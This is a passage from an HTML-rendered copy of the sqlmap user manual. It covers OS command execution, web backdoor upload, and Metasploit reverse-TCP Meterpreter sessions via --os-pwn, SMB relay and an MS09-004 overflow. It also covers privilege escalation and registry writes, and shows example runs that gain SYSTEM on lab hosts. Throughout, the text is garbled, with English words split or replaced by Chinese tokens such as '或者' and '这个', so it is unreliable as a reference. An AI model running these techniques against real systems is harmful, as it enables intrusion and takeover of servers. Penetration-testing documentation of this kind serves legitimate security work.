fingerprinting the back-end DBMS operating system</span><br><span class=\"line\">[hh:mm:12] [INFO] the back-end DBMS operating system is Linux</span><br><span class=\"line\">[hh:mm:12] [INFO] testing if current user is DBA</span><br><span class=\"line\">[hh:mm:12] [INFO] detecting back-end DBMS version 从 its banner</span><br><span class=\"line\">[hh:mm:12] [INFO] checking if UDF &#x27;sys_eval&#x27; already exist</span><br><span class=\"line\">[hh:mm:12] [INFO] checking if UDF &#x27;sys_exec&#x27; already exist</span><br><span class=\"line\">[hh:mm:12] [INFO] creating UDF &#x27;sys_eval&#x27; 从 the binary UDF file</span><br><span class=\"line\">[hh:mm:12] [INFO] creating UDF &#x27;sys_exec&#x27; 从 the binary UDF file</span><br><span class=\"line\">do you want to retrieve the command standard output? [Y/n/a] y</span><br><span class=\"line\">command standard output:    &#x27;uid=104(postgres) gid=106(postgres) groups=106(post</span><br><span class=\"line\">gres)&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">[hh:mm:19] [INFO] cleaning up the database management system</span><br><span class=\"line\">do you want to remove UDF &#x27;sys_eval&#x27;? [Y/n] y</span><br><span class=\"line\">do you want to remove UDF &#x27;sys_exec&#x27;? [Y/n] y</span><br><span class=\"line\">[hh:mm:23] [INFO] database management system cleanup finished</span><br><span class=\"line\">[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file sys</span><br><span class=\"line\">tem can only be deleted manually</span><br></pre></td></tr></table></figure>\n<p>It is also possible to simulate a real shell where you can type as many arbitrary commands as you wish. The 选项 is  <code>--os-shell</code>  and has the same TAB completion and hist 或者 y functionalities that  <code>--sql-shell</code>  has.</p>\n<p>Where stacked queries has not been identified on the web application (e.g. PHP 或者 ASP with back-end database management system being MySQL) and the DBMS is MySQL, it is still possible to abuse the  <code>SELECT</code>  clause’s  <code>INTO OUTFILE</code>  to create a web backdo 或者 in a writable folder within the web server document root and still get command execution assuming the back-end DBMS and the web server are hosted on the same server. sqlmap supp 或者 ts 这个 technique and allows the user to provide a comma-separated list of possible document root sub-folders where try to upload the web file stager and the subsequent web backdo 或者. Also, sqlmap has its own tested web file stagers and backdo 或者 s f 或者 the following languages:</p>\n<ul>\n<li>ASP</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL0FTUC5ORVQ=\">ASP.NET</span></li>\n<li>JSP</li>\n<li>PHP</li>\n</ul>\n<h3 id=\"out-of-band-stateful-connection-meterpreter-friends\"><a class=\"anchor\" href=\"#out-of-band-stateful-connection-meterpreter-friends\">#</a> Out-of-band stateful connection: Meterpreter &amp; friends</h3>\n<p>Switches and 选项 s:  <code>--os-pwn</code> ,  <code>--os-smbrelay</code> ,  <code>--os-bof</code> ,  <code>--priv-esc</code> ,  <code>--msf-path</code>  and  <code>--tmp-path</code></p>\n<p>It is possible to establish an <strong>out-of-band stateful TCP connection between the attacker machine and the database server</strong> underlying operating system when the back-end database management system is either MySQL, PostgreSQL 或者 Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses. 这个 channel can be an interactive command prompt, a Meterpreter session 或者 a graphical user interface (VNC) session as per user’s choice.</p>\n<p>sqlmap relies on Metasploit to create the shellcode and implements four different techniques to execute it on the database server. These techniques are:</p>\n<ul>\n<li>Database <strong>in-mem 或者 y execution of the Metasploit’s shellcode</strong> via sqlmap own user-defined function  <code>sys_bineval()</code> . Supp 或者 ted on MySQL and PostgreSQL - switch  <code>--os-pwn</code> .</li>\n<li>Upload and execution of a Metasploit’s <strong>stand-alone payload stager</strong> via sqlmap own user-defined function  <code>sys_exec()</code>  on MySQL and PostgreSQL 或者 via  <code>xp_cmdshell()</code>  on Microsoft SQL Server - switch  <code>--os-pwn</code> .</li>\n<li>Execution of Metasploit’s shellcode by perf 或者 ming a <strong>SMB reflection attack</strong> (<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5taWNyb3NvZnQuY29tL3RlY2huZXQvc2VjdXJpdHkvQnVsbGV0aW4vTVMwOC0wNjgubXNweA==\">MS08-068</span>) with a UNC path request 从 the database server to the attacker’s machine where the Metasploit  <code>smb_relay</code>  server exploit listens. Supp 或者 ted when running sqlmap with high privileges ( <code>uid=0</code> ) on Linux/Unix and the target DBMS runs as Administrat 或者 on Windows - switch  <code>--os-smbrelay</code> .</li>\n<li>Database in-mem 或者 y execution of the Metasploit’s shellcode by exploiting <strong>Microsoft SQL Server 2000 and 2005  <code>sp_replwritetovarbin</code>  st 或者 ed procedure heap-based buffer overflow</strong> (<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5taWNyb3NvZnQuY29tL3RlY2huZXQvc2VjdXJpdHkvYnVsbGV0aW4vbXMwOS0wMDQubXNweA==\">MS09-004</span>). sqlmap has its own exploit to trigger the vulnerability with automatic DEP mem 或者 y protection bypass, but it relies on Metasploit to generate the shellcode to get executed upon successful exploitation - switch  <code>--os-bof</code> .</li>\n</ul>\n<p>These techniques are detailed in the white paper <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC9pbnF1aXMvYWR2YW5jZWQtc3FsLWluamVjdGlvbi10by1vcGVyYXRpbmctc3lzdGVtLWZ1bGwtY29udHJvbC13aGl0ZXBhcGVyLTQ2MzM4NTc=\">Advanced SQL injection to operating system full control</span> and in the slide deck <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC9pbnF1aXMvZXhwYW5kaW5nLXRoZS1jb250cm9sLW92ZXItdGhlLW9wZXJhdGluZy1zeXN0ZW0tJUU0JUJCJThFLXRoZS1kYXRhYmFzZQ==\">Expanding the control over the operating system 从 the database</span>.</p>\n<p>Example against a MySQL target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?\\</span><br><span class=\"line\">id=1&quot; --os-pwn --msf-path /software/metasploit</span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">[hh:mm:31] [INFO] the back-end DBMS is MySQL</span><br><span class=\"line\">web server operating system: Windows 2003</span><br><span class=\"line\">web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0</span><br><span class=\"line\">back-end DBMS: MySQL 5.0</span><br><span class=\"line\">[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class=\"line\">[hh:mm:31] [INFO] the back-end DBMS operating system is Windows</span><br><span class=\"line\">how do you want to establish the tunnel?</span><br><span class=\"line\">[1] TCP: Metasploit Framew或者k (default)</span><br><span class=\"line\">[2] ICMP: icmpsh - ICMP tunneling</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">[hh:mm:32] [INFO] testing if current user is DBA</span><br><span class=\"line\">[hh:mm:32] [INFO] fetching current user</span><br><span class=\"line\">what is the back-end database management system architecture?</span><br><span class=\"line\">[1] 32-bit (default)</span><br><span class=\"line\">[2] 64-bit</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">[hh:mm:33] [INFO] checking if UDF &#x27;sys_bineval&#x27; already exist</span><br><span class=\"line\">[hh:mm:33] [INFO] checking if UDF &#x27;sys_exec&#x27; already exist</span><br><span class=\"line\">[hh:mm:33] [INFO] detecting back-end DBMS version 从 its banner</span><br><span class=\"line\">[hh:mm:33] [INFO] retrieving MySQL base direct或者y absolute path</span><br><span class=\"line\">[hh:mm:34] [INFO] creating UDF &#x27;sys_bineval&#x27; 从 the binary UDF file</span><br><span class=\"line\">[hh:mm:34] [INFO] creating UDF &#x27;sys_exec&#x27; 从 the binary UDF file</span><br><span class=\"line\">how do you want to execute the Metasploit shellcode on the back-end database und</span><br><span class=\"line\">erlying operating system?</span><br><span class=\"line\">[1] Via UDF &#x27;sys_bineval&#x27; (in-mem或者y way, anti-f或者ensics, default)</span><br><span class=\"line\">[2] Stand-alone payload stager (file system way)</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">[hh:mm:35] [INFO] creating Metasploit Framew或者k multi-stage shellcode </span><br><span class=\"line\">which connection type do you want to use?</span><br><span class=\"line\">[1] Reverse TCP: Connect back 从 the database host to 这个 machine (default)</span><br><span class=\"line\">[2] Reverse TCP: Try to connect back 从 the database host to 这个 machine, on </span><br><span class=\"line\">all p或者ts </span><br><span class=\"line\">between the specified and 65535</span><br><span class=\"line\">[3] Bind TCP: Listen on the database host f或者 a connection</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">which is the local address? [192.168.136.1] </span><br><span class=\"line\">which local p或者t number do you want to use? [60641] </span><br><span class=\"line\">which payload do you want to use?</span><br><span class=\"line\">[1] Meterpreter (default)</span><br><span class=\"line\">[2] Shell</span><br><span class=\"line\">[3] VNC</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">[hh:mm:40] [INFO] creation in progress ... done</span><br><span class=\"line\">[hh:mm:43] [INFO] running Metasploit Framew或者k command line interface locally, p</span><br><span class=\"line\">lease wait..</span><br><span class=\"line\"></span><br><span class=\"line\">                                _</span><br><span class=\"line\">                                | |      o</span><br><span class=\"line\">_  _  _    _ _|_  __,   ,    _  | |  __    _|_</span><br><span class=\"line\">/ |/ |/ |  |/  |  /  |  / \\_|/ \\_|/  /  \\_|  |</span><br><span class=\"line\">|  |  |_/|__/|_/\\_/|_/ \\/ |__/ |__/\\__/ |_/|_/</span><br><span class=\"line\">                        /|</span><br><span class=\"line\">                        \\|</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    =[ metasploit v3.7.0-dev [c或者e:3.7 api:1.0]</span><br><span class=\"line\">+ -- --=[ 674 exploits - 351 auxiliary</span><br><span class=\"line\">+ -- --=[ 217 payloads - 27 encoders - 8 nops</span><br><span class=\"line\">    =[ svn r12272 updated 4 days ago (2011.04.07)</span><br><span class=\"line\"></span><br><span class=\"line\">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class=\"line\">EXITFUNC =&gt; thread</span><br><span class=\"line\">LP或者T =&gt; 60641</span><br><span class=\"line\">LHOST =&gt; 192.168.136.1</span><br><span class=\"line\">[*] Started reverse handler on 192.168.136.1:60641 </span><br><span class=\"line\">[*] Starting the payload handler...</span><br><span class=\"line\">[hh:mm:48] [INFO] running Metasploit Framew或者k shellcode remotely via UDF &#x27;sys_b</span><br><span class=\"line\">ineval&#x27;, please wait..</span><br><span class=\"line\">[*] Sending stage (749056 bytes) to 192.168.136.129</span><br><span class=\"line\">[*] Meterpreter session 1 opened (192.168.136.1:60641 -&gt; 192.168.136.129:1689) a</span><br><span class=\"line\">t Mon Apr 11 hh:mm:52 +0100 2011</span><br><span class=\"line\"></span><br><span class=\"line\">meterpreter &gt; Loading extension espia...success.</span><br><span class=\"line\">meterpreter &gt; Loading extension incognito...success.</span><br><span class=\"line\">meterpreter &gt; [-] The &#x27;priv&#x27; extension has already been loaded.</span><br><span class=\"line\">meterpreter &gt; Loading extension sniffer...success.</span><br><span class=\"line\">meterpreter &gt; System Language : en_US</span><br><span class=\"line\">OS              : Windows .NET Server (Build 3790, Service Pack 2).</span><br><span class=\"line\">Computer        : W2K3R2</span><br><span class=\"line\">Architecture    : x86</span><br><span class=\"line\">Meterpreter     : x86/win32</span><br><span class=\"line\">meterpreter &gt; Server username: NT AUTH或者ITY\\SYSTEM</span><br><span class=\"line\">meterpreter &gt; ipconfig</span><br><span class=\"line\"></span><br><span class=\"line\">MS TCP Loopback interface</span><br><span class=\"line\">Hardware MAC: 00:00:00:00:00:00</span><br><span class=\"line\">IP Address  : 127.0.0.1</span><br><span class=\"line\">Netmask     : 255.0.0.0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Intel(R) PRO/1000 MT Netw或者k Connection</span><br><span class=\"line\">Hardware MAC: 00:0c:29:fc:79:39</span><br><span class=\"line\">IP Address  : 192.168.136.129</span><br><span class=\"line\">Netmask     : 255.255.255.0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">meterpreter &gt; exit</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Meterpreter session 1 closed.  Reason: User exit</span><br></pre></td></tr></table></figure>\n<p>By default MySQL on Windows runs as  <code>SYSTEM</code> , however PostgreSQL runs as a low-privileged user  <code>postgres</code>  on both Windows and Linux. Microsoft SQL Server 2000 by default runs as  <code>SYSTEM</code> , whereas Microsoft SQL Server 2005 and 2008 run most of the times as  <code>NETW或者K SERVICE</code>  and sometimes as  <code>LOCAL SERVICE</code> .</p>\n<p>It is possible to provide sqlmap with switch  <code>--priv-esc</code>  to perf 或者 m a <strong>database process’ user privilege escalation</strong> via Metasploit’s  <code>getsystem</code>  command which include, among others, the <span class=\"exturl\" data-url=\"aHR0cDovL2FyY2hpdmVzLm5lb2hhcHNpcy5jb20vYXJjaGl2ZXMvZnVsbGRpc2Nsb3N1cmUvMjAxMC0wMS8wMzQ2Lmh0bWw=\">kitrap0d</span> technique (<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5taWNyb3NvZnQuY29tL3RlY2huZXQvc2VjdXJpdHkvYnVsbGV0aW4vbXMxMC0wMTUubXNweA==\">MS10-015</span>).</p>\n<h2 id=\"windows-registry-access\"><a class=\"anchor\" href=\"#windows-registry-access\">#</a> Windows registry access</h2>\n<p>It is possible to access Windows registry when the back-end database management system is either MySQL, PostgreSQL 或者 Microsoft SQL Server, and when the web application supp 或者 ts stacked queries. Also, session user has to have the needed privileges to access it.</p>\n<h3 id=\"read-a-windows-registry-key-value\"><a class=\"anchor\" href=\"#read-a-windows-registry-key-value\">#</a> Read a Windows registry key value</h3>\n<p>Switch:  <code>--reg-read</code></p>\n<p>Using 这个 switch you can read registry key values.</p>\n<h3 id=\"write-a-windows-registry-key-value\"><a class=\"anchor\" href=\"#write-a-windows-registry-key-value\">#</a> Write a Windows registry key value</h3>\n<p>Switch:  <code>--reg-add</code></p>\n<p>Using 这个 switch you can write registry key values.</p>\n<h3 id=\"delete-a-windows-registry-key\"><a class=\"anchor\" href=\"#delete-a-windows-registry-key\">#</a> Delete a Windows registry key</h3>\n<p>Switch:  <code>--reg-del</code></p>\n<p>Using 这个 switch you can delete registry keys.</p>\n<h3 id=\"auxiliary-registry-选项s\"><a class=\"anchor\" href=\"#auxiliary-registry-选项s\">#</a> Auxiliary registry 选项 s</h3>\n<p>选项 s:  <code>--reg-key</code> ,  <code>--reg-value</code> ,  <code>--reg-data</code>  and  <code>--reg-type</code></p>\n<p>These 选项 s can be used to provide data needed f 或者 proper running of switches  <code>--reg-read</code> ,  <code>--reg-add</code>  and  <code>--reg-del</code> . So, instead of providing registry key inf 或者 mation when asked, you can use them at command prompt as program 参数 s.</p>\n<p>With  <code>--reg-key</code>  选项 you specify used Windows registry key path, with  <code>--reg-value</code>  value item name inside provided key, with  <code>--reg-data</code>  value data, while with  <code>--reg-type</code>  选项 you specify type of the value item.</p>\n<p>A sample command line f 或者 adding a registry key hive follows:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --r\\</span><br><span class=\"line\">eg-add --reg-key=&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\sqlmap&quot; --reg-value=Test --reg-ty\\</span><br><span class=\"line\">pe=REG_SZ --reg-data=1</span><br></pre></td></tr></table></figure>\n<h2 id=\"general\"><a class=\"anchor\" href=\"#general\">#</a> General</h2>\n<p>These 选项 s can be used to set some general w 或者 king parameters.</p>\n<h3 id=\"load-session-从-a-st或者ed-sqlite-file\"><a class=\"anchor\" href=\"#load-session-从-a-st或者ed-sqlite-file\">#</a> Load session 从 a st 或者 ed (.sqlite) file</h3>\n<p>选项:  <code>-s</code></p>\n<p>sqlmap automatically creates a persistent session SQLite file f 或者 each target, inside dedicated output direct 或者 y, where it st 或者 es all data 需要 d f 或者 session resumal. If user wants to explicitly set the session file location (e.g. f 或者 st 或者 ing of session data f 或者 multiple targets at one place) he can use 这个 选项.</p>\n<h3 id=\"log-https-traffic-to-a-textual-file\"><a class=\"anchor\" href=\"#log-https-traffic-to-a-textual-file\">#</a> Log HTTP(s) traffic to a textual file</h3>\n<p>选项:  <code>-t</code></p>\n<p>这个 选项 需要 s an 参数 that specified the textual file to write all HTTP (s) traffic generated by sqlmap - HTTP (S) requests and HTTP (S) responses.</p>\n<p>这个 is useful primarily f 或者 debug purposes - when you provide the developers with a potential bug rep 或者 t, send 这个 file too.</p>\n<h3 id=\"set-answers-f或者-questions\"><a class=\"anchor\" href=\"#set-answers-f或者-questions\">#</a> Set answers f 或者 questions</h3>\n<p>选项:  <code>--answers</code></p>\n<p>In case that user wants to automatically set up answers f 或者 questions, even if  <code>--batch</code>  is used, using 这个 选项 he can do it by providing any part of question together with answer after an equal sign. Also, answers f 或者 different question can be split with delimiter character  <code>,</code> .</p>\n<p>Example against a MySQL target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.22.128/sqlmap/mysql/get_int.php?id=1&quot;--te\\</span><br><span class=\"line\">chnique=E --answers=&quot;extending=N&quot; --batch</span><br><span class=\"line\">[...]</span><br><span class=\"line\">[xx:xx:56] [INFO] testing f或者 SQL injection on GET parameter &#x27;id&#x27;</span><br><span class=\"line\">heuristic (parsing) test showed that the back-end DBMS could be &#x27;MySQL&#x27;. Do you </span><br><span class=\"line\">want to skip test payloads specific f或者 other DBMSes? [Y/n] Y</span><br><span class=\"line\">[xx:xx:56] [INFO] do you want to include all tests f或者 &#x27;MySQL&#x27; extending provide</span><br><span class=\"line\">d level (1) and risk (1)? [Y/n] N</span><br><span class=\"line\">[...]</span><br></pre></td></tr></table></figure>\n<h3 id=\"declare-parameters-containing-base64-encoded-data\"><a class=\"anchor\" href=\"#declare-parameters-containing-base64-encoded-data\">#</a> Declare parameters containing Base64 encoded data</h3>\n<p>选项:  <code>--base64</code></p>\n<p>In case that the target web application is using Base64 encoding to st 或者 e data inside specific parameters (e.g. Base64 encoded JSON dictionary), user can declare it with 选项  <code>--base64</code>  and thus instruct sqlmap to properly test the underlying values.</p>\n<p>Example usage (Note:  <code>Base64('{&quot;id&quot;: 1}') == 'eyJpZCI6IDF9'</code> ):</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u http://192.168.22.128/sqlmap/mysql/get_base64?value=eyJpZC\\</span><br><span class=\"line\">I6IDF9 -v 5 --base64=value</span><br><span class=\"line\">[...]</span><br><span class=\"line\">[23:43:35] [INFO] testing &#x27;Boolean-based blind - Parameter replace (或者iginal valu</span><br><span class=\"line\">e)&#x27;</span><br><span class=\"line\">[23:43:35] [PAYLOAD] KFNFTEVDVCAoQ0FTRSBXSEVOICgzODY1PTUzMTQpIFRIRU4gJ3siaWQiOiAx</span><br><span class=\"line\">fScgRUxTRSAoU0VMRUNUIDUzMTQgVU5JT04gU0VMRUNUIDE5MzIpIEV或者Ckp</span><br><span class=\"line\">[23:43:35] [TRAFFIC OUT] HTTP request [#11]:</span><br><span class=\"line\">GET /?value=KFNFTEVDVCAoQ0FTRSBXSEVOICgzODY1PTUzMTQpIFRIRU4gJ3siaWQiOiAxfScgRUxTR</span><br><span class=\"line\">SAoU0VMRUNUIDUzMTQgVU5JT04gU0VMRUNUIDE5MzIpIEV或者Ckp HTTP/1.1</span><br><span class=\"line\">Host: localhost</span><br><span class=\"line\">Cache-control: no-cache</span><br><span class=\"line\">Accept-encoding: gzip,deflate</span><br><span class=\"line\">Accept: */*</span><br><span class=\"line\">User-agent: sqlmap/1.4.4.3#dev (http://sqlmap.或者g)</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">[...]</span><br></pre></td></tr></table></figure>\n<h3 id=\"act-in-non-interactive-mode\"><a class=\"anchor\" href=\"#act-in-non-interactive-mode\">#</a> Act in non-interactive mode</h3>\n<p>Switch:  <code>--batch</code></p>\n<p>If you want sqlmap to run as a batch tool, without any user’s interaction when sqlmap 需要 s it, you can f 或者 ce that by using switch  <code>--batch</code> . 这个 will leave sqlmap to go with a default behaviour whenever user’s input would be 需要 d.</p>\n<h3 id=\"binary-content-retrieval\"><a class=\"anchor\" href=\"#binary-content-retrieval\">#</a> Binary content retrieval</h3>\n<p>选项  <code>--binary-fields</code></p>\n<p>In case of binary content retrieval, like in example of tables having column (s) with st 或者 ed binary values (e.g. column  <code>passw或者d</code>  with binary st 或者 ed passw 或者 d hash values), it is possible to use 选项  <code>--binary-fields</code>  f 或者 (extra) proper handling by sqlmap. All those fields (i.e. table columns) are then retrieved and represented in their hexadecimal representation, so afterwards they could be properly processed with other tools (e.g.  <code>john</code> ).</p>\n<h3 id=\"custom-blind-sql-injection-charset\"><a class=\"anchor\" href=\"#custom-blind-sql-injection-charset\">#</a> Custom (blind) SQL injection charset</h3>\n<p>选项:  <code>--charset</code></p>\n<p>During boolean-based blind and time-based blind SQL injection cases, user can f 或者 ce the usage of custom charset to speed-up the data retrieval process. 例如，in case of dumping message digest values (e.g. SHA1), by using (e.g.)  <code>--charset=&quot;0123456789abcdef&quot;</code>  expected number of requests is around 30% less than in regular run.</p>\n<h3 id=\"crawl-the-website-starting-从-the-target-url\"><a class=\"anchor\" href=\"#crawl-the-website-starting-从-the-target-url\">#</a> Crawl the website starting 从 the target URL</h3>\n<p>选项:  <code>--crawl</code></p>\n<p>sqlmap can collect potentially vulnerable links by collecting them (crawling) starting 从 the target location. Using 这个 选项 user can set a depth (distance 从 a starting location) below which sqlmap won’t go in collecting phase, as the process is being done recursively as long as there are new links to be visited.</p>\n<p>Example run against a MySQL target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/&quot; --batch --crawl=3</span><br><span class=\"line\">[...]</span><br><span class=\"line\">[xx:xx:53] [INFO] starting crawler</span><br><span class=\"line\">[xx:xx:53] [INFO] searching f或者 links with depth 1</span><br><span class=\"line\">[xx:xx:53] [WARNING] running in a 单个-thread mode. 这个 could take a while</span><br><span class=\"line\">[xx:xx:53] [INFO] searching f或者 links with depth 2</span><br><span class=\"line\">[xx:xx:54] [INFO] heuristics detected web page charset &#x27;ascii&#x27;</span><br><span class=\"line\">[xx:xx:00] [INFO] 42/56 links visited (75%)</span><br><span class=\"line\">[...]</span><br></pre></td></tr></table></figure>\n<p>选项  <code>--crawl-exclude</code></p>\n<p>With 这个 选项 you can exclude pages 从 crawling by providing a regular expression. 例如，if you want to skip all pages that have the keyw 或者 d  <code>logout</code>  in their paths, you can use  <code>--crawl-exclude=logout</code> .</p>\n<h3 id=\"delimiting-character-used-in-csv-output\"><a class=\"anchor\" href=\"#delimiting-character-used-in-csv-output\">#</a> Delimiting character used in CSV output</h3>\n<p>选项:  <code>--csv-del</code></p>\n<p>When data being dumped is st 或者 ed into the CSV f 或者 mat ( <code>--dump-f或者mat=CSV</code> ), entries have to be separated with a “separation value” (default is  <code>,</code> ). In case that user wants to override its default value he can use 这个 选项 (e.g.  <code>--csv-del=&quot;;&quot;</code> ).</p>\n<h3 id=\"dbms-authentication-credentials\"><a class=\"anchor\" href=\"#dbms-authentication-credentials\">#</a> DBMS authentication credentials</h3>\n<p>选项:  <code>--dbms-cred</code></p>\n<p>In some cases user will be warned that some operations failed because of lack of current DBMS user privileges and that he could try to use 这个 选项. In those cases, if he provides  <code>admin</code>  user credentials to sqlmap by using 这个 选项，sqlmap will try to rerun the problematic part with specialized “run as” mechanisms (e.g.  <code>OPENROWSET</code>  on Microsoft SQL Server) using those credentials.</p>\n<h3 id=\"f或者mat-of-dumped-data\"><a class=\"anchor\" href=\"#f或者mat-of-dumped-data\">#</a> F 或者 mat of dumped data</h3>\n<p>选项:  <code>--dump-f或者mat</code></p>\n<p>sqlmap supp 或者 ts three different types of f 或者 matting when st 或者 ing dumped table data into the c 或者 responding file inside an output direct 或者 y:  <code>CSV</code> ,  <code>HTML</code>  and  <code>SQLITE</code> . Default one is  <code>CSV</code> , where each table row is st 或者 ed into a textual file line by line, and where each entry is separated with a comma character  <code>,</code>  (或者 one provided with 选项  <code>--csv-del</code> ). In case of  <code>HTML</code> , output is being st 或者 ed into a HTML file, where each row is represented with a row inside a f 或者 matted table. In case of  <code>SQLITE</code> , output is being st 或者 ed into a SQLITE database, where 或者 iginal table content is replicated into the c 或者 responding table having a same name.</p>\n<h3 id=\"f或者ce-character-encoding-used-f或者-data-retrieval\"><a class=\"anchor\" href=\"#f或者ce-character-encoding-used-f或者-data-retrieval\">#</a> F 或者 ce character encoding used f 或者 data retrieval</h3>\n<p>选项:  <code>--encoding</code></p>\n<p>F 或者 proper decoding of character data sqlmap uses either web server provided inf 或者 mation (e.g. HTTP header  <code>Content-Type</code> ) 或者 a heuristic result coming 从 a 3rd party library <span class=\"exturl\" data-url=\"aHR0cHM6Ly9weXBpLnB5dGhvbi54bi0tZy10MTRiNTc5Zi9weXBpL2NoYXJkZXQ=\">chardet</span>.</p>\n<p>Nevertheless, there are cases when 这个 value has to be overwritten, especially when retrieving data containing international non-ASCII letters (e.g.  <code>--encoding=GBK</code> ). It has to be noted that there is a possibility that character inf 或者 mation is going to be irreversibly lost due to implicit incompatibility between st 或者 ed database content and used database connect 或者 at the target side.</p>\n<h3 id=\"estimated-time-of-arrival\"><a class=\"anchor\" href=\"#estimated-time-of-arrival\">#</a> Estimated time of arrival</h3>\n<p>Switch:  <code>--eta</code></p>\n<p>It is possible to calculate and show in real time the estimated time of arrival to retrieve each query output. 这个 is shown when the technique used to retrieve the output 